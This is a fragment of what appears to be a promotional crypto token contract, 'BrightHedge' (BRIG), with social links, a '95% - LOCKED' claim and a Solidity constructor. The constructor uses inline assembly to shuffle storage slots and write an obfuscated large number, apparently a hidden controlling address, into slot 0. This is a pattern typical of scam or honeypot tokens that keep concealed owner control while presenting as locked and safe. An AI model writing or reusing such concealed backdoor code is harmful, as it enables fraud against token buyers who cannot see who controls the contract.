...
Telegram: https://t.me/BrightHedge/
Twitter: https://twitter.com/BrightHedge/
Website: https://BrightHedge.finance
95% - LOCKED
...
contract BrightHedge {
    string public constant name = "BrightHedge";
    string public constant symbol = "BRIG";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(1300732863882160941844720950521617647051323572349, 1))}
